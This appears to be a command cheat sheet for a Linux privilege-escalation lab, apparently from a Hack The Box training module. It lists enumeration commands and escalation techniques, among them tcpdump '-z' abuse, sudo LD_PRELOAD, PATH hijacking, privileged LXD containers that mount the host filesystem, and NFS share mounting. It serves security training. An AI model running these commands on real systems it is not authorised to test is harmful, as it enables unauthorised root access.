SSH to lab target

```
ssh htb-student@<target IP>
```

See processes running as root

```
ps aux | grep root
```

See logged in users

```
ps au
```

View user home directories

```
ls /home
```

Check for SSH keys for current user

```
ls -l ~/.ssh
```

Check the current user's Bash history

```
history
```

Can the user run anything as another user?

```
sudo -l
```

Check for daily Cron jobs

```
ls -la /etc/cron.daily
```

Check for unmounted file systems/drives

```
lsblk
```

Find world-writeable directories

```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Find world-writeable files

```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Check the Kernel versiion

```
uname -a
```

Check the OS version

```
cat /etc/lsb-release 
```

Compile an exploit written in C

```
gcc kernel_expoit.c -o kernel_expoit
```

Check the installed version of `Screen`

```
screen -v
```

View running processes with `pspy`

```
./pspy64 -pf -i 1000
```

Find binaries with the SUID bit set

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Find binaries with the SETGID bit set

```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Priv esc with `tcpdump`

```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Check the current user's PATH variable contents

```
echo $PATH
```

Add a `.` to the beginning of the current user's PATH

```
PATH=.:${PATH}
```

Search for config files

```
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

View the shared objects required by a binary

```
ldd /bin/ls
```

Escalate privileges using `LD_PRELOAD`

```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Check the RUNPATH of a binary

```
readelf -d payroll  | grep PATH
```

Compiled a shared libary

```
gcc src.c -fPIC -shared -o /development/libshared.so
```

Start the LXD initialization process

```
lxd init
```

Import a local image

```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged LXD container

```
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system in a container

```
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Start the container

```
lxc start r00t
```

Show the NFS export list

```
showmount -e 10.129.2.12
```

Mount an NFS share locally

```
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

Created a shared `tmux` session socket

```
tmux -S /shareds new -s debugsess
```

Perform a system audit with `Lynis`

```
./lynis audit system
```
